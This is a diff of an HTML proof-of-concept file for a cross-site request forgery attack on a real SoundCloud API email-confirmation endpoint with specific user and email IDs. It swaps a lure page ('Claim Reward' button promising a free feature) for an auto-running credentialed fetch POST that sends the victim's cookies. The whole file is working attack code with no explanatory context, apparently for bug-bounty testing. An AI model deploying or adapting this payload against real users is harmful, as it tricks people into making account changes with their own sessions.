@@ -1,14 +1,14 @@
-<!-- csrf-button-poc.html -->
-<html>
-  <body>
-    <h2>Click the button below to get a free feature!</h2>
-
-    <form action="https://api-v2.soundcloud.com/users/1417348911/emails/1582294131/confirmation" method="POST" id="csrfForm">
-      <!-- Add hidden inputs here if the endpoint expects any -->
-    </form>
-
-    <button onclick="document.getElementById('csrfForm').submit();">
-      Claim Reward
-    </button>
-  </body>
-</html>
+<script>
+fetch("https://api-v2.soundcloud.com/users/1417348911/emails/1582294131/confirmation", {
+  method: "POST",
+  credentials: "include", // ensures cookies are sent if session-based auth is used
+  headers: {
+    "Content-Type": "application/json"
+    // "Authorization": "Bearer <token>"  <-- only works if CORS allows it, and you have the token
+  },
+  body: JSON.stringify({})
+})
+.then(response => response.text())
+.then(data => console.log("Response:", data))
+.catch(err => console.error("Error:", err));
+</script>
